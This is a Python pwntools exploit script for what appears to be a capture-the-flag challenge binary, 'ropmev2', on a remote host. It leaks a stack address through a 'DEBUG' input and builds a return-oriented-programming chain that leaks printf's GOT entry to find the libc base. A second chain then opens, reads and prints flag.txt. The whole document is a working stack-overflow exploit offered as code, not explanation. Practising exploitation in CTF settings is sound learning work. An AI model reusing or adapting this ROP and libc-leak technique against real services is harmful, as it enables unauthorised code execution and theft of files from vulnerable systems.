from pwn import *

exe = './ropmev2'
context.binary = exe

# p = process(exe)
p = remote('139.59.178.146', 32614)

# libc = ELF('./libc.self')
libc = ELF('./libc.target')

elf = ELF(exe)

p.recv(timeout=0.5)
p.sendline(b'DEBUG')
leak = p.recv(timeout=1)
leak = leak.split(b'\nPlease')[0]
leak = leak.split(b' ')[-1]
BUFFER_ADDRESS = int(leak.decode('latin-1'), 16)
log.info(f"BUFFER_ADDRESS = {hex(BUFFER_ADDRESS)}")


POP_RDI = 0x000000000040142b
POP_RSI_R15 = 0x0000000000401429
POP_RDX_R13 = 0x0000000000401164
MAIN_FUNC = 0x0040116b

# rbp at offset 200

def leak_bytes(address):
    payload = flat({
        0: 0,
        216: POP_RDI,
        224: address,
        232: elf.plt['printf'],
        240: MAIN_FUNC
    })

    p.clean()
    p.sendline(payload)
    leak = p.recv(timeout=0.5).split(b'Please dont')[0]
    return leak

def leak_memory(address):
    leak = leak_bytes(address)
    v = int.from_bytes(leak, 'little')
    return v


GOT_PRINTF = leak_memory(elf.got['printf'])
log.info(f"GOT_PRINTF = {hex(GOT_PRINTF)}")

libc.address = GOT_PRINTF - libc.sym['printf']
log.info(f"Libc base address: {hex(libc.address)}")
# assert(libc.address == p.libs()['/usr/lib/x86_64-linux-gnu/libc-2.31.so'])

buf = BUFFER_ADDRESS - 0xb8

payload = flat({
    0: 0,
    8: b'flag.txt\x00', # data goes into address 'buf'
    208: 0 # rbp
})

# fd = 3 # local
fd = 6 # remote returns 6 as the file descriptor for some reason

payload += p64(POP_RDI) + p64(buf) + p64(POP_RSI_R15) + p64(0) + p64(0) + p64(libc.sym['open']) # open("flag.txt", 0)
payload += p64(POP_RDI) + p64(fd) + p64(POP_RSI_R15) + p64(buf) + p64(0) + p64(POP_RDX_R13) + p64(20) + p64(0) + p64(libc.sym['read']) # read(fd, buf, 20)
payload += p64(POP_RDI) + p64(1) + p64(POP_RSI_R15) + p64(buf) + p64(0) + p64(POP_RDX_R13) + p64(20) + p64(0) + p64(libc.sym['write']) # write(1, buf, 20)
payload += p64(MAIN_FUNC)

p.clean()
p.sendline(payload)

print(p.recv(timeout=1))
